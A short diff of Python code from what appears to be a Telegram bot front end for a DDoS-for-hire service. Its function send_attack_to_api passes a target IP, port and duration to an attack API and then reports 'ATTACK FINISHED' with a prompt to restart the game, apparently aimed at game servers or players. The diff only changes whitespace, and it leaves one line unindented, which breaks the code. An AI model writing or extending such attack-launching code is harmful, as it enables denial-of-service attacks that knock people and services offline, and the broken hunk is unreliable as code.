@@ -244,14 +244,14 @@ def stop_hosted_bot(bot_token):
 def send_attack_to_api(ip, port, duration, chat_id, bot_instance, is_hosted=False):
     try:
         api_params = {
-            "api_key": API_KEY,
-            "target": ip,
-            "port": port,
-            "time": duration,
+            "api_key": API_KEY, 
+            "target": ip, 
+            "port": port, 
+            "time": duration, 
             "concurrent": 1
         }
-        response = requests.get(API_URL, params=api_params, timeout=15)
-        
+response = requests.get(API_URL, params=api_params, timeout=15)
+
         if response.status_code == 200:
             time.sleep(duration)
             bot_instance.send_message(chat_id, f"✅ ATTACK FINISHED!\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔄 Restart your game!")
